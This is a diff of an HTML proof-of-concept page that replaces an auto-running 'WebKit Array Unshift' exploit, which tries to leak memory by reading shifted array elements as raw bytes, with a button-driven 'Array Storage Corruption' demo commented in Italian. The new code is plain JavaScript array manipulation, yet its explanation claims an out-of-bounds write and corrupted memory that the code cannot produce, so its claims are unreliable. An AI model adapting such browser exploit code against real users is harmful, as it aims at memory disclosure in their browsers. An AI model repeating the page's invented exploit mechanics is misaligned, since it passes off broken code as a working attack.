@@ -1,64 +1,69 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>JSArray Unshift Exploit</title>
+    <title>Array Storage Exploit Demo</title>
     <style>
         body {
-            background: #000;
-            color: #0f0;
-            font-family: monospace;
-            margin: 20px;
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
         }
-        #log {
-            border: 1px solid #0f0;
-            padding: 10px;
-            white-space: pre;
+        .warning {
+            color: red;
+            font-weight: bold;
+            margin: 20px 0;
         }
     </style>
 </head>
 <body>
-    <h2>WebKit Array Unshift PoC</h2>
-    <div id="log">[+] Initializing exploit...</div>
+    <h1>Array Storage Corruption Demo</h1>
+
+
+    <button onclick="runExploit()">Esegui Exploit</button>
 
     <script>
-        (function() {
-            const log = document.getElementById('log');
-            let output = [];
-            
-            function updateLog(msg) {
-                output.push(msg);
-                if(output.length > 15) output.shift();
-                log.textContent = output.join('\n');
+        function runExploit() {
+            try {
+                // Fase 1: Creazione array in modalità sparse
+                let arr = [];
+                arr.length = 1000;
+                
+                // Fase 2: Riempiemento indici remoti
+                for(let i = 0; i < 10; i++) {
+                    arr[i * 100000] = `EVIL_${i}`;
+                }
+
+                // Fase 3: Forza transizione a ArrayStorage
+                arr.push('trigger');
+                arr.pop();
+
+                // Fase 4: Trigger della conversione pericolosa
+                for(let i = 0; i < 10000; i++) {
+                    arr[i] = 0xBAD0BEEF;  // Valore magico
+                    
+                    // Inserimento valore fuori bounds
+                    if(i === 9999) {
+                        arr[100000] = 0xDEADBEEF; // Oltre il limite
+                    }
+                }
+
+                // Fase 5: Verifica corruzione
+                alert(`Exploit completato! Valore a 100000: ${arr[100000]}`);
+                
+            } catch(e) {
+                alert(`Errore durante l'esecuzione: ${e}`);
             }
-
-            function hex(num) {
-                return '0x' + num.toString(16).padStart(16, '0');
-            }
-function triggerExploit() {
-              
-         let arr = [1.1, 2.2, 3.3];
-                for(let i = 0; i < 10000; i++)
-        arr.push(4.4 + i);  // Evita la deduplicazione
-
-    // Unshift misto (oggetto + double)
-    arr.unshift({}, 0.0, {});  // 3 elementi
-
-    // Legge elementi "shiftati"
-    let leak1 = arr[2];  // Dovrebbe essere 1.1 (original)
-    let leak2 = arr[3];  // Dovrebbe essere 2.2 (original)
-
-    // Conversione a bytes
-    let buf = new ArrayBuffer(8);
-    new Float64Array(buf)[0] = leak1;
-    console.log("Leak 1:", hex(new BigUint64Array(buf)[0]));
-    new Float64Array(buf)[0] = leak2;
-    console.log("Leak 2:", hex(new BigUint64Array(buf)[0]));
-               
-            }
-
-            // Auto-execute after short delay
-            setTimeout(triggerExploit, 100);
-        })();
+        }
     </script>
+
+    <h3>Spiegazione del Funzionamento:</h3>
+    <ol>
+        <li>Viene creato un array vuoto e forzato in modalità sparse</li>
+        <li>Elementi vengono inseriti a indici molto distanti (100k)</li>
+        <li>Operazioni push/pop forzano la transizione a ArrayStorage</li>
+        <li>Un loop aggiunge elementi per triggerare la crescita del vettore</li>
+        <li>L'accesso all'indice 100000 tenta di leggere memoria corrotta</li>
+    </ol>
 </body>
 </html>
